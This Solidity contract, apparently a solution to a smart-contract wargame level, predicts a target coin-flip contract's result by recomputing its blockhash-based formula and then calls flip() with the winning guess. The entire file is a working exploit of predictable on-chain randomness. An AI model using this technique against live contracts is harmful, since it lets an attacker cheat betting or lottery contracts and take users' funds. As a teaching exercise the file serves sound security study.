// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {AbstractCoinFlip} from "./AbstractCoinFlip.sol";

contract CoinFlipGuesser {
    function submitGuess(
        AbstractCoinFlip _coinFlipContract
    ) public returns (bool) {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        bool guess = _getGuess(factor);

        return _coinFlipContract.flip(guess);
    }

    function _getGuess(uint256 factor) internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / factor;
        bool guess = coinFlip == 1 ? true : false;
        return guess;
    }
}
